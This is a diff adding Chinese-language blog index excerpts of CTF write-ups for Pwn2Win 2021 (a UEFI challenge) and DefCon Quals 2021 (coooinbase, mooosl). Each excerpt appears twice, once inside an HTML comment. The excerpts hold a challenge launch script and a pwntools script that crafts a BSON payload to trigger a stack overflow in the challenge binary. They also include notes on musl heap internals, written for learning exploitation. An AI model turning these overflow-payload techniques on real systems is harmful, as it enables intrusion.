@@ -123,6 +123,234 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/06/26/解决第一个UEFI-PWN——Accessing-the-Truth解题思路/" title="Pwn2Win CTF 2021 Accessing the Truth的解题思路">解决第一个UEFI PWN——Accessing the Truth解题思路</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-06-26  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/243007" target="_blank" rel="noopener">解决第一个UEFI PWN——Accessing the Truth解题思路</a></p>
+<p>前段时间打了场PWN2WIN，期间遇到了这道BIOS题，正好来学习一下UEFI PWN<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622448541945-1622448541947.png" alt="title"></p>
+<p>题目包含下列文件<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622448612466-1622448612467.png" alt="title"></p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p><code>run.py</code>是题目给的启动脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3 -u</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import subprocess</span><br><span class="line">import tempfile</span><br><span class="line"></span><br><span class="line">def random_string(n):</span><br><span class="line">    return &#39;&#39;.join(random.choice(string.ascii_lowercase) for _ in range(n))</span><br><span class="line"></span><br><span class="line">def check_pow(bits):</span><br><span class="line">    r &#x3D; random_string(10)</span><br><span class="line">    print(f&quot;hashcash -mb&#123;bits&#125; &#123;r&#125;&quot;)</span><br><span class="line">    solution &#x3D; input(&quot;Solution: \n&quot;).strip()</span><br><span class="line">    if subprocess.call([&quot;hashcash&quot;, f&quot;-cdb&#123;bits&#125;&quot;, &quot;-r&quot;, r, solution],</span><br><span class="line">                       cwd&#x3D;&quot;&#x2F;tmp&quot;,</span><br><span class="line">                       stdout&#x3D;subprocess.DEVNULL,</span><br><span class="line">                       stderr&#x3D;subprocess.DEVNULL) !&#x3D; 0:</span><br><span class="line">        raise Exception(&quot;Invalid PoW&quot;)</span><br><span class="line"></span><br><span class="line">#check_pow(25)</span><br><span class="line"></span><br><span class="line">fname &#x3D; tempfile.NamedTemporaryFile().name</span><br><span class="line"></span><br><span class="line">subprocess.call([&quot;cp&quot;, &quot;OVMF.fd&quot;, fname])</span><br><span class="line">try:</span><br><span class="line">  subprocess.call([&quot;chmod&quot;, &quot;u+w&quot;, fname])</span><br><span class="line">  subprocess.call([&quot;qemu-system-x86_64&quot;,</span><br><span class="line">                   &quot;-monitor&quot;, &quot;&#x2F;dev&#x2F;null&quot;,</span><br><span class="line">                   &quot;-m&quot;, &quot;64M&quot;,</span><br><span class="line">                   &quot;-drive&quot;, &quot;if&#x3D;pflash,format&#x3D;raw,file&#x3D;&quot; + fname, </span><br><span class="line">                   &quot;-drive&quot;, &quot;file&#x3D;fat:rw:contents,format&#x3D;raw&quot;,</span><br><span class="line">                   &quot;-net&quot;, &quot;none&quot;,</span><br><span class="line">                   &quot;-nographic&quot;], stderr&#x3D;subprocess.DEVNULL, timeout&#x3D;60)</span><br><span class="line">except:</span><br><span class="line">  pass</span><br><span class="line"></span><br><span class="line">subprocess.call([&quot;rm&quot;, &quot;-rf&quot;, fname])</span><br><span class="line">print(&quot;Bye!&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>注释掉pow，直接启动。启动起来是一个低权限用户的linux虚拟机，目标是获取根目录下flag.txt的内容，典型的内核题<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449605453-1622449605456.png" alt="title"></p>
+<p>仔细看启动命令，貌似没加载任何可疑的虚拟设备，排除掉QEMU逃逸<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449718327-1622449718327.png" alt="title"></p>
+<p>解开<code>contents/initramfs.cpio</code>，看到init文件。这里有一条<code>mount -t efivarfs efivarfs /sys/firmware/efi/efivars</code>，怀疑是UEFI PWN<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449853859-1622449853860.png" alt="title"></p>
+<p>另外，启动脚本里有60秒的timout，需要把这里干掉<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622450018868-1622450018871.png" alt="title"></p>
+	
+
+	</div>
+  <a type="button" href="/2021/06/26/解决第一个UEFI-PWN——Accessing-the-Truth解题思路/#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/243007" target="_blank" rel="noopener">解决第一个UEFI PWN——Accessing the Truth解题思路</a></p>
+<p>前段时间打了场PWN2WIN，期间遇到了这道BIOS题，正好来学习一下UEFI PWN<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622448541945-1622448541947.png" alt="title"></p>
+<p>题目包含下列文件<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622448612466-1622448612467.png" alt="title"></p>
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p><code>run.py</code>是题目给的启动脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3 -u</span><br><span class="line">import random</span><br><span class="line">import string</span><br><span class="line">import subprocess</span><br><span class="line">import tempfile</span><br><span class="line"></span><br><span class="line">def random_string(n):</span><br><span class="line">    return &#39;&#39;.join(random.choice(string.ascii_lowercase) for _ in range(n))</span><br><span class="line"></span><br><span class="line">def check_pow(bits):</span><br><span class="line">    r &#x3D; random_string(10)</span><br><span class="line">    print(f&quot;hashcash -mb&#123;bits&#125; &#123;r&#125;&quot;)</span><br><span class="line">    solution &#x3D; input(&quot;Solution: \n&quot;).strip()</span><br><span class="line">    if subprocess.call([&quot;hashcash&quot;, f&quot;-cdb&#123;bits&#125;&quot;, &quot;-r&quot;, r, solution],</span><br><span class="line">                       cwd&#x3D;&quot;&#x2F;tmp&quot;,</span><br><span class="line">                       stdout&#x3D;subprocess.DEVNULL,</span><br><span class="line">                       stderr&#x3D;subprocess.DEVNULL) !&#x3D; 0:</span><br><span class="line">        raise Exception(&quot;Invalid PoW&quot;)</span><br><span class="line"></span><br><span class="line">#check_pow(25)</span><br><span class="line"></span><br><span class="line">fname &#x3D; tempfile.NamedTemporaryFile().name</span><br><span class="line"></span><br><span class="line">subprocess.call([&quot;cp&quot;, &quot;OVMF.fd&quot;, fname])</span><br><span class="line">try:</span><br><span class="line">  subprocess.call([&quot;chmod&quot;, &quot;u+w&quot;, fname])</span><br><span class="line">  subprocess.call([&quot;qemu-system-x86_64&quot;,</span><br><span class="line">                   &quot;-monitor&quot;, &quot;&#x2F;dev&#x2F;null&quot;,</span><br><span class="line">                   &quot;-m&quot;, &quot;64M&quot;,</span><br><span class="line">                   &quot;-drive&quot;, &quot;if&#x3D;pflash,format&#x3D;raw,file&#x3D;&quot; + fname, </span><br><span class="line">                   &quot;-drive&quot;, &quot;file&#x3D;fat:rw:contents,format&#x3D;raw&quot;,</span><br><span class="line">                   &quot;-net&quot;, &quot;none&quot;,</span><br><span class="line">                   &quot;-nographic&quot;], stderr&#x3D;subprocess.DEVNULL, timeout&#x3D;60)</span><br><span class="line">except:</span><br><span class="line">  pass</span><br><span class="line"></span><br><span class="line">subprocess.call([&quot;rm&quot;, &quot;-rf&quot;, fname])</span><br><span class="line">print(&quot;Bye!&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>注释掉pow，直接启动。启动起来是一个低权限用户的linux虚拟机，目标是获取根目录下flag.txt的内容，典型的内核题<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449605453-1622449605456.png" alt="title"></p>
+<p>仔细看启动命令，貌似没加载任何可疑的虚拟设备，排除掉QEMU逃逸<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449718327-1622449718327.png" alt="title"></p>
+<p>解开<code>contents/initramfs.cpio</code>，看到init文件。这里有一条<code>mount -t efivarfs efivarfs /sys/firmware/efi/efivars</code>，怀疑是UEFI PWN<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622449853859-1622449853860.png" alt="title"></p>
+<p>另外，启动脚本里有60秒的timout，需要把这里干掉<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/31/1622450018868-1622450018871.png" alt="title"></p>
+	
+	</div>
+  <a type="button" href="/2021/06/26/解决第一个UEFI-PWN——Accessing-the-Truth解题思路/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/06/26/PWN掉一款小型开源OS——续篇：内核态PWN/" title="DefCon Quals 2021 coooinbase-kernel的解题思路">PWN掉一款小型开源OS——续篇：内核态PWN</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-06-26  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/242627" target="_blank" rel="noopener">PWN掉一款小型开源OS——续篇：内核态PWN</a></p>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621834179965-1621834179966.png" alt="title"><br>本篇文章是coooinbase这道题的内核态利用。作为上一篇文章<code>PWN掉一款小型开源OS——用户态利用</code>的续篇，本文将解决上文遗留下的一些问题，并分析从userland到kerneland的利用机会。</p>
+<h1 id="遗留下的问题"><a href="#遗留下的问题" class="headerlink" title="遗留下的问题"></a>遗留下的问题</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line"></span><br><span class="line">obj = &#123;</span><br><span class="line">    <span class="string">'CVC'</span>:<span class="number">111</span>,</span><br><span class="line">    <span class="string">'MON'</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">'YR'</span>: <span class="number">2021</span></span><br><span class="line">&#125;</span><br><span class="line">bs = bson.dumps(obj)</span><br><span class="line"></span><br><span class="line">bs = bs[:<span class="number">-1</span>]</span><br><span class="line">bs += <span class="string">b'\x02'</span></span><br><span class="line">bs += <span class="string">b'CC'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += p32(<span class="number">0x10</span>)</span><br><span class="line">bs += <span class="string">b'A'</span>*(<span class="number">0x60</span>)</span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">print(b64e(bs)+<span class="string">' '</span>)</span><br></pre></td></tr></table></figure>
+<p>若按照上一篇文章的bson结构去构造payload，即<code>&#39;CVC&#39;:111</code>，当payload大于一定长度时会导致不能到达以下分支，没法触发漏洞<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622191188255-1622191188256.png" alt="title"></p>
+<p>原因是<code>copy_payload</code>的返回值不为0<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622191874009-1622191874010.png" alt="title"></p>
+<p>让<code>copy_payload</code>执行到这个分支即可返回0，经过测试<code>&#39;CVC&#39;:545</code>能通过check<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622193008468-1622193008469.png" alt="title"></p>
+<p>按以下方法构造bson序列，便能发送长字符串，并触发栈溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line"></span><br><span class="line">obj = &#123;</span><br><span class="line">    <span class="string">'CVC'</span>:<span class="number">545</span>,</span><br><span class="line">    <span class="string">'MON'</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">'YR'</span>: <span class="number">2021</span></span><br><span class="line">&#125;</span><br><span class="line">bs = bson.dumps(obj)</span><br><span class="line"></span><br><span class="line">bs = bs[:<span class="number">-1</span>]</span><br><span class="line">bs += <span class="string">b'\x02'</span></span><br><span class="line">bs += <span class="string">b'CC'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += p32(<span class="number">0x10</span>)</span><br><span class="line">bs += <span class="string">b'A'</span>*(<span class="number">0x60</span>)</span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">print(b64e(bs)+<span class="string">' '</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622193238128-1622193238129.png" alt="title"></p>
+	
+
+	</div>
+  <a type="button" href="/2021/06/26/PWN掉一款小型开源OS——续篇：内核态PWN/#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/242627" target="_blank" rel="noopener">PWN掉一款小型开源OS——续篇：内核态PWN</a></p>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/24/1621834179965-1621834179966.png" alt="title"><br>本篇文章是coooinbase这道题的内核态利用。作为上一篇文章<code>PWN掉一款小型开源OS——用户态利用</code>的续篇，本文将解决上文遗留下的一些问题，并分析从userland到kerneland的利用机会。</p>
+<h1 id="遗留下的问题"><a href="#遗留下的问题" class="headerlink" title="遗留下的问题"></a>遗留下的问题</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line"></span><br><span class="line">obj = &#123;</span><br><span class="line">    <span class="string">'CVC'</span>:<span class="number">111</span>,</span><br><span class="line">    <span class="string">'MON'</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">'YR'</span>: <span class="number">2021</span></span><br><span class="line">&#125;</span><br><span class="line">bs = bson.dumps(obj)</span><br><span class="line"></span><br><span class="line">bs = bs[:<span class="number">-1</span>]</span><br><span class="line">bs += <span class="string">b'\x02'</span></span><br><span class="line">bs += <span class="string">b'CC'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += p32(<span class="number">0x10</span>)</span><br><span class="line">bs += <span class="string">b'A'</span>*(<span class="number">0x60</span>)</span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">print(b64e(bs)+<span class="string">' '</span>)</span><br></pre></td></tr></table></figure>
+<p>若按照上一篇文章的bson结构去构造payload，即<code>&#39;CVC&#39;:111</code>，当payload大于一定长度时会导致不能到达以下分支，没法触发漏洞<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622191188255-1622191188256.png" alt="title"></p>
+<p>原因是<code>copy_payload</code>的返回值不为0<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622191874009-1622191874010.png" alt="title"></p>
+<p>让<code>copy_payload</code>执行到这个分支即可返回0，经过测试<code>&#39;CVC&#39;:545</code>能通过check<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622193008468-1622193008469.png" alt="title"></p>
+<p>按以下方法构造bson序列，便能发送长字符串，并触发栈溢出</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line"></span><br><span class="line">obj = &#123;</span><br><span class="line">    <span class="string">'CVC'</span>:<span class="number">545</span>,</span><br><span class="line">    <span class="string">'MON'</span>:<span class="number">1</span>,</span><br><span class="line">    <span class="string">'YR'</span>: <span class="number">2021</span></span><br><span class="line">&#125;</span><br><span class="line">bs = bson.dumps(obj)</span><br><span class="line"></span><br><span class="line">bs = bs[:<span class="number">-1</span>]</span><br><span class="line">bs += <span class="string">b'\x02'</span></span><br><span class="line">bs += <span class="string">b'CC'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += p32(<span class="number">0x10</span>)</span><br><span class="line">bs += <span class="string">b'A'</span>*(<span class="number">0x60</span>)</span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line">bs += <span class="string">b'\x00'</span></span><br><span class="line"></span><br><span class="line">print(b64e(bs)+<span class="string">' '</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/28/1622193238128-1622193238129.png" alt="title"></p>
+	
+	</div>
+  <a type="button" href="/2021/06/26/PWN掉一款小型开源OS——续篇：内核态PWN/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/06/26/PWN掉一款小型开源OS——用户态利用/" title="DefCon Quals 2021 coooinbase的解题思路">PWN掉一款小型开源OS——用户态利用</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-06-26  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/242112" target="_blank" rel="noopener">PWN掉一款小型开源OS——用户态利用</a></p>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326290561-1621326290590.png" alt="title"><br>题目来源于DefCon Quals 2021的coooinbase二连pwn，第一部分是用户空间利用，第二部分是内核利用。本篇文章是coooinbase用户态pwn的解题思路。</p>
+<p>在Github上找到对应源码<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326380004-1621326380005.png" alt="title"></p>
+<p>这是一款极其精简的的OS，没有shell，甚至只实现了有限的几个系统调用，包括open、read、write等。在<code>coooinbase.bin</code>这个内核基础上，再跑着一个用户态进程<code>run</code>，以下是关于<code>run</code>这个用户态进程的pwn<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326468550-1621326468553.png" alt="title"></p>
+<h1 id="Ruby源码审计"><a href="#Ruby源码审计" class="headerlink" title="Ruby源码审计"></a>Ruby源码审计</h1><p>给了以下几个文件，执行<code>ruby x.rb</code>启动题目环境<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621329312675-1621329312678.png" alt="title"></p>
+<p>解压文件系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/dos</span><br><span class="line">sudo mount -o loop ./rootfs.img /tmp/dos</span><br><span class="line">file /tmp/dos/bin</span><br><span class="line">/tmp/dos/bin: PDP-11 kernel overlay</span><br><span class="line">cat /tmp/dos/flg</span><br><span class="line">OOO&#123;this_is_from_userland&#125;</span><br></pre></td></tr></table></figure>
+
+<p>x.rb，会对输入的<code>credit_card</code>进行校验，看下是否valid，可用<code>4485-7873-4804-0088</code>通过检查<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621584844106-1621584844111.png" alt="title"></p>
+<p>通过POST方法<code>/gen-bson</code>获取<code>cvv</code>、<code>expmonth</code>、<code>expyear</code>、<code>cardnumber</code>参数，序列化成bson数据，最后转成base64。但是，bson只能接受<code>0x0~0x7f</code>的utf-8数据，超出这个范围的byte数据会导致没法通过x.rb的check，这为后续构造rop带来困难。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621585746598-1621585746599.png" alt="title"></p>
+	
+
+	</div>
+  <a type="button" href="/2021/06/26/PWN掉一款小型开源OS——用户态利用/#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/242112" target="_blank" rel="noopener">PWN掉一款小型开源OS——用户态利用</a></p>
+<p><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326290561-1621326290590.png" alt="title"><br>题目来源于DefCon Quals 2021的coooinbase二连pwn，第一部分是用户空间利用，第二部分是内核利用。本篇文章是coooinbase用户态pwn的解题思路。</p>
+<p>在Github上找到对应源码<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326380004-1621326380005.png" alt="title"></p>
+<p>这是一款极其精简的的OS，没有shell，甚至只实现了有限的几个系统调用，包括open、read、write等。在<code>coooinbase.bin</code>这个内核基础上，再跑着一个用户态进程<code>run</code>，以下是关于<code>run</code>这个用户态进程的pwn<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621326468550-1621326468553.png" alt="title"></p>
+<h1 id="Ruby源码审计"><a href="#Ruby源码审计" class="headerlink" title="Ruby源码审计"></a>Ruby源码审计</h1><p>给了以下几个文件，执行<code>ruby x.rb</code>启动题目环境<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/18/1621329312675-1621329312678.png" alt="title"></p>
+<p>解压文件系统</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mkdir /tmp/dos</span><br><span class="line">sudo mount -o loop ./rootfs.img /tmp/dos</span><br><span class="line">file /tmp/dos/bin</span><br><span class="line">/tmp/dos/bin: PDP-11 kernel overlay</span><br><span class="line">cat /tmp/dos/flg</span><br><span class="line">OOO&#123;this_is_from_userland&#125;</span><br></pre></td></tr></table></figure>
+
+<p>x.rb，会对输入的<code>credit_card</code>进行校验，看下是否valid，可用<code>4485-7873-4804-0088</code>通过检查<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621584844106-1621584844111.png" alt="title"></p>
+<p>通过POST方法<code>/gen-bson</code>获取<code>cvv</code>、<code>expmonth</code>、<code>expyear</code>、<code>cardnumber</code>参数，序列化成bson数据，最后转成base64。但是，bson只能接受<code>0x0~0x7f</code>的utf-8数据，超出这个范围的byte数据会导致没法通过x.rb的check，这为后续构造rop带来困难。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/21/1621585746598-1621585746599.png" alt="title"></p>
+	
+	</div>
+  <a type="button" href="/2021/06/26/PWN掉一款小型开源OS——用户态利用/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/06/26/借助DefCon-Quals-2021的mooosl学习musl-mallocng（漏洞利用篇）/" title="DefCon Quals 2021 mooosl的解题思路">借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-06-26  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>本文首发于安全客：<a href="https://www.anquanke.com/post/id/241104" target="_blank" rel="noopener">借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）</a></p>
+<p>上篇我们大致过了一遍musl libc 1.2.2的mallocng源码，了解到musl堆管理器用以下的结构管理着meta、group以及chunk。本篇我们继续来分析mooosl这道题的解题思路。<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/13/1620877156490-1620877156490.png" alt="title"></p>
+<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p>保护全开<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620961337503-1620961337534.png" alt="title"></p>
+<p>程序主要提供了<code>store</code>、<code>query</code>、<code>delete</code>这几个功能，下面逐个功能进行分析<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620961459130-1620961459131.png" alt="title"></p>
+<p>sotre，申请0x30的chunk，用于存放key、value以及对应的size，另外还会算出hash和prev_hash_map（保存着hash_map先前在该处的指针）<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620973183066-1620973183067.png" alt="title"></p>
+<p>set_key和set_value，比较类似，根据输入的size去申请chunk，然后填入key和value，所以store方法一共会申请3个chunk<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/05/14/1620962248015-1620962248017.png" alt="title"></p>
